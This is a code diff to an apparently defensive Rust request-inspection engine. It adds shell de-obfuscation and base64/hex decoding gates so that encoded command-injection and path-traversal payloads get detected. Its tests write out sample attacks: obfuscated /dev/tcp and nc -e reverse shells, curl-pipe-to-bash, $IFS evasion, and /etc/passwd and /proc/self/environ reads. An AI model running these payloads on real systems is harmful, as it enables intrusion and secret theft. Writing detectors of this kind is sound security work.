@@ -65,6 +65,30 @@ static STRONG_STRUCTURE: LazyLock<Option<Regex>> = LazyLock::new(|| {
     .ok()
 });
 
+/// The **single source of truth** for the RCE / Traversal "strong structure"
+/// marker (codex A-2 / A-3): the union of the default-on RCE + Traversal detector
+/// rule patterns, taken directly from
+/// [`super::detectors::default_on_rce_traversal_patterns`]. Both Lane-2 synthetic
+/// gates use it, so a view is emitted IFF a default-on detector could fire on the
+/// result — the gate and the detector rule set can never drift into two lists:
+///   * [`shell_normalize`] emits a shell-de-obfuscated view only when the result
+///     matches one of these (without it, `it's` → `its` would emit a view for
+///     every benign field);
+///   * [`looks_structural`] lets a base64 / hex wrapper past the blind gate when
+///     the DECODED bytes match one of these, so `base64("bash -c id")` and
+///     `base64("../../etc/passwd")` finally surface a `BlindDecoded` view (they
+///     previously could not — the gate was SQL-only).
+///
+/// The patterns are joined with top-level `|` (each is a complete alternation of
+/// its own); `None` only if that fails to compile (it will not), in which case the
+/// gates decline to emit (no panic, iron rule).
+static NORMALISED_STRONG_STRUCTURE: LazyLock<Option<Regex>> = LazyLock::new(|| {
+    let joined = super::detectors::default_on_rce_traversal_patterns()
+        .collect::<Vec<_>>()
+        .join("|");
+    Regex::new(&joined).ok()
+});
+
 /// Whether decoded bytes look like a real (SQL-ish) payload rather than random
 /// noise — the gate that keeps blind base64 / hex decoding from emitting a view
 /// for every high-entropy token (plan §7.2, codex A-4).
@@ -123,6 +147,17 @@ fn looks_structural(decoded: &str) -> bool {
     // real attack even without a second keyword, so an encoded wrapper around it
     // still surfaces a BlindDecoded view.
     if STRONG_STRUCTURE.as_ref().is_some_and(|re| re.is_match(&lower)) {
+        return true;
+    }
+    // Tier 2b (codex A-2): the SAME strong-structure bar for RCE / Traversal —
+    // a base64 / hex wrapper around a default-on RCE (`bash -c id`, `nc -e …`) or
+    // sensitive-path traversal (`../../etc/passwd`) payload must also surface a
+    // BlindDecoded view. Sourced from the default-on detector rules so the blind
+    // gate never accepts a structure the detector would reject, nor vice versa.
+    if NORMALISED_STRONG_STRUCTURE
+        .as_ref()
+        .is_some_and(|re| re.is_match(&lower))
+    {
         return true;
     }
     // Tier 3: weak keyword evidence needs corroboration.
@@ -515,9 +550,10 @@ struct TransformChild {
     text: String,
 }
 
-/// Apply each of the four non-URL transforms (HTML-entity decode, SQL-comment
-/// strip, blind base64, blind hex) to `text`, returning the ones that fired
-/// (codex A-4 transform composition).
+/// Apply each of the five non-URL transforms (HTML-entity decode, SQL-comment
+/// strip, blind base64, blind hex, and — the fifth, added in P1c — shell
+/// de-obfuscation) to `text`, returning the ones that fired (codex A-4 transform
+/// composition).
 ///
 /// `parent_tainted` propagates hard-veto ineligibility down the chain: a child
 /// of a blind/comment lineage is stamped with a non-hard-veto provenance even if
@@ -577,7 +613,55 @@ fn transform_children(text: &str, parent_tainted: bool) -> Vec<TransformChild> {
             text: t,
         });
     }
+    // Shell de-obfuscation (plan §8.3): a blind, synthetic normalisation, so it
+    // is stamped BlindDecoded (never hard-veto), exactly like base64/hex.
+    if let Some(t) = shell_normalize(text) {
+        out.push(TransformChild {
+            provenance: Provenance::BlindDecoded,
+            tainted: true,
+            text: t,
+        });
+    }
     out
+}
+
+/// De-obfuscate common shell command-injection evasions so the RCE detector
+/// sees the canonical command form (plan §8.3): drop single/double quotes
+/// (`c''at` → `cat`), drop backslashes (`ca\t` → `cat`), and collapse the `$IFS`
+/// field-separator idiom (`$IFS`, `${IFS}`, `$IFS$9`) to a space
+/// (`cat$IFS/etc/passwd` → `cat /etc/passwd`).
+///
+/// Returns `Some` only when something actually changed **and** the result looks
+/// like a real shell structure ([`NORMALISED_STRONG_STRUCTURE`], the shared
+/// default-on RCE/Traversal marker); a benign quote/backslash therefore never
+/// synthesises a view. Because the gate is the default-on detector rule set,
+/// every obfuscation a default-on rule can catch after normalisation — quote-split
+/// `python3 -c`, `nc -e`, pipe-to-interpreter, `/proc` sensitive read — passes
+/// the gate (codex A-3), not just the old bash/sh subset. The produced view is
+/// always tagged [`Provenance::BlindDecoded`] (never hard-veto): shell
+/// de-obfuscation can synthesise a command a backend would not run, so a match on
+/// it is scored but can never single-signal Block (plan §6.3, same rule as blind
+/// decode).
+fn shell_normalize(s: &str) -> Option<String> {
+    if !(s.contains('\'') || s.contains('"') || s.contains('\\') || s.contains("$IFS")) {
+        return None;
+    }
+    // Collapse the `$IFS` idiom (longest forms first), then strip shell quotes
+    // and escaping backslashes.
+    let work = s.replace("${IFS}", " ").replace("$IFS$9", " ").replace("$IFS", " ");
+    let mut out = String::with_capacity(work.len());
+    for c in work.chars() {
+        if !matches!(c, '\'' | '"' | '\\') {
+            out.push(c);
+        }
+    }
+    if out == s {
+        return None;
+    }
+    NORMALISED_STRONG_STRUCTURE
+        .as_ref()
+        .is_some_and(|re| re.is_match(&out.to_ascii_lowercase()))
+        .then_some(out)
 }
 
 /// Maximum transform-composition depth (codex A-4): depth 1 = a single transform
@@ -1106,6 +1190,43 @@ mod tests {
     }
 
     #[test]
+    fn shell_normalised_view_is_produced_and_marked_blind() {
+        // `c''at$IFS/etc/passwd` de-obfuscates to `cat /etc/passwd` on a
+        // BlindDecoded view (quotes dropped, `$IFS` → space).
+        let views = body_views(b"cmd=c''at$IFS/etc/passwd");
+        let v = views
+            .iter()
+            .find(|v| v.provenance == Provenance::BlindDecoded)
+            .expect("a shell-normalised view must be produced");
+        assert!(
+            v.lower_trunc.contains("cat /etc/passwd"),
+            "shell normalisation must restore the command: {:?}",
+            v.lower_trunc
+        );
+    }
+
+    #[test]
+    fn shell_normalise_collapses_backslash_and_ifs() {
+        // Backslash escaping and the `$IFS$9` idiom around a reverse-shell path.
+        let out = shell_normalize(r"ba\sh$IFS-i$IFS>&$IFS/dev/tcp/1.2.3.4/9001")
+            .expect("obfuscated reverse shell must normalise");
+        assert!(out.contains("/dev/tcp/"), "normalised: {out:?}");
+    }
+
+    #[test]
+    fn benign_quotes_do_not_synthesise_shell_view() {
+        // Stripping quotes from prose must not synthesise a shell view (the gate).
+        let views = body_views(b"msg=it's a great day and don't worry");
+        assert!(
+            views.iter().all(|v| v.provenance == Provenance::Raw),
+            "benign quote stripping must not synthesise a shell view: {:?}",
+            views.iter().map(|v| v.provenance).collect::<Vec<_>>()
+        );
+        // The function itself declines on benign input.
+        assert!(shell_normalize("it's a 'quoted' word").is_none());
+    }
+
+    #[test]
     fn clean_field_produces_no_extra_decode_views() {
         // A benign body: only the raw round-0 view, no entity/comment/blind views.
         let views = body_views(b"name=alice&role=admin&page=2");
@@ -1248,6 +1369,127 @@ mod tests {
             Provenance::BlindDecoded,
             "a child of a blind lineage stays tainted (non-hard-veto), not relabelled HtmlEntityDecoded"
         );
+    }
+
+    // ── A-2: blind base64/hex gate now surfaces RCE + Traversal (codex A-2) ────
+
+    #[test]
+    fn blind_gate_passes_base64_rce_exec_flag() {
+        // codex A-2: base64("bash -c id") must now surface a BlindDecoded view —
+        // the blind gate was SQL-only before P1c's must-fix.
+        let payload = STANDARD.encode("bash -c id");
+        let views = body_views(format!("cmd={payload}").as_bytes());
+        assert!(
+            views
+                .iter()
+                .any(|v| v.provenance == Provenance::BlindDecoded && v.text.contains("bash -c id")),
+            "base64-wrapped RCE exec flag must surface a BlindDecoded view: {:?}",
+            views
+                .iter()
+                .map(|v| (v.provenance, v.text.as_ref()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn blind_gate_passes_base64_reverse_shell() {
+        // base64("nc -e /bin/sh 10.0.0.1 4444") — a complete reverse-shell form.
+        let payload = STANDARD.encode("nc -e /bin/sh 10.0.0.1 4444");
+        let views = body_views(format!("q={payload}").as_bytes());
+        assert!(
+            views
+                .iter()
+                .any(|v| v.provenance == Provenance::BlindDecoded && v.text.contains("nc -e")),
+            "base64-wrapped reverse shell must surface a BlindDecoded view"
+        );
+    }
+
+    #[test]
+    fn blind_gate_passes_base64_and_hex_sensitive_traversal() {
+        // codex A-2: base64("../../../etc/passwd") and hex("../../etc/passwd") must
+        // both surface a BlindDecoded view revealing the sensitive path.
+        let b64 = STANDARD.encode("../../../etc/passwd");
+        let b64_views = body_views(format!("file={b64}").as_bytes());
+        assert!(
+            b64_views
+                .iter()
+                .any(|v| v.provenance == Provenance::BlindDecoded && v.text.contains("/etc/passwd")),
+            "base64-wrapped traversal must surface a BlindDecoded view"
+        );
+        let hexed = hex::encode("../../etc/passwd");
+        let hex_views = body_views(format!("id=0x{hexed}").as_bytes());
+        assert!(
+            hex_views
+                .iter()
+                .any(|v| v.provenance == Provenance::BlindDecoded && v.text.contains("/etc/passwd")),
+            "hex-wrapped traversal must surface a BlindDecoded view"
+        );
+    }
+
+    #[test]
+    fn blind_gate_rejects_benign_base64_prose() {
+        // A base64-wrapped ordinary sentence (no RCE / Traversal / SQL structure)
+        // must still be gated out — the RCE/Traversal markers are strong, not noisy.
+        let payload = STANDARD.encode("python is a very pleasant language to write");
+        let views = body_views(format!("note={payload}").as_bytes());
+        assert!(
+            views.iter().all(|v| v.provenance == Provenance::Raw),
+            "benign base64 prose must not surface a blind view: {:?}",
+            views.iter().map(|v| v.provenance).collect::<Vec<_>>()
+        );
+    }
+
+    // ── A-3: shell gate mirrors the default-on RCE rule set (codex A-3) ────────
+
+    #[test]
+    fn shell_normalised_python_exec_flag_view_is_produced() {
+        // codex A-3: quote/`$IFS`-split `python3 -c id` — a default-on rule the OLD
+        // bash/sh-only gate dropped — must now normalise to a BlindDecoded view.
+        let views = body_views(b"cmd=pyth''on3$IFS-c$IFSid");
+        let v = views
+            .iter()
+            .find(|v| v.provenance == Provenance::BlindDecoded)
+            .expect("a shell-normalised python view must be produced");
+        assert!(
+            v.lower_trunc.contains("python3 -c id"),
+            "shell normalisation must restore `python3 -c id`: {:?}",
+            v.lower_trunc
+        );
+    }
+
+    #[test]
+    fn shell_gate_shares_the_default_on_detector_rules() {
+        // codex A-3: the shell / blind gate is BUILT from the default-on RCE +
+        // Traversal detector patterns (single source of truth). A representative
+        // de-obfuscated hit for each default-on rule must pass the shared gate, and
+        // structures moved out of the default-on set (bare mkfifo, `/etc/hosts`)
+        // and benign prose must NOT.
+        let re = NORMALISED_STRONG_STRUCTURE.as_ref().expect("shared gate compiles");
+        for hit in [
+            "bash -i >& /dev/tcp/1.2.3.4/9001", // reverse_shell (/dev/tcp)
+            "nc -e /bin/sh 1.2.3.4 9001",       // reverse_shell (nc -e)
+            "python3 -c id",                    // shell_exec_flag
+            "perl -e exec",                     // shell_exec_flag
+            "powershell -enc zm9v",             // shell_exec_flag
+            "$(whoami)",                        // cmd_subst
+            "curl http://x | bash",             // piped_shell
+            "; wget http://x/y",                // fetch_exec
+            "cat /etc/passwd",                  // sensitive_read
+            "head /proc/self/environ",          // sensitive_read (/proc)
+            "/etc/passwd",                      // traversal.sensitive_abs
+            "%2e%2e%2f",                        // traversal.encoded_dotdot
+            "..%c0%af",                         // traversal.overlong
+        ] {
+            assert!(re.is_match(hit), "shared gate must accept a default-on hit: {hit:?}");
+        }
+        for miss in [
+            "mkfifo is a posix utility for named pipes", // mkfifo moved to default-off
+            "the quick brown fox jumps over the dog",
+            "python is a great language",
+            "resolver reads /etc/hosts for lookups", // /etc/hosts moved to default-off
+        ] {
+            assert!(!re.is_match(miss), "shared gate must reject: {miss:?}");
+        }
     }
 
     #[test]
